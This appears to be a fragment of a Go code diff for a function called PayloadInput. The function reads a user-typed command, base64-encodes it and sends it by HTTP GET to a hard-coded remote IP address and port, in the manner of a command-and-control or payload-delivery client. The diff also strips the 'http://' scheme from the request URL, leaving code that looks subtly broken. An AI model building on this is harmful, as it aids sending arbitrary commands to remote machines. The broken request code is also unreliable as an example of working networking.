@@ -15,7 +15,7 @@ func PayloadInput() {
 	var payloadcmd string
 	targetip := "168.138.44.152"
 	targetport := "8080"
-	sourceip, err := sysinfo.GetIP()
+	sourceip, err := sysinfo.GetIntIP()
 	if err != nil {
 		fmt.Println("Error:", err)
 		return
@@ -27,9 +27,10 @@ func PayloadInput() {
 		if scanner.Scan() {
 			payloadcmd = scanner.Text()
 		}
+		// payloadcmd =
 		encodedpayloadcmd := base64.StdEncoding.EncodeToString([]byte(payloadcmd))
-		target := "http://" + targetip + ":" + targetport
-		req, err := http.NewRequest(("GET"), target, nil)
+		targeturl := targetip + ":" + targetport
+		req, err := http.NewRequest(("GET"), targeturl, nil)
 		if err != nil {
 			fmt.Println("Error:", err)
 			return
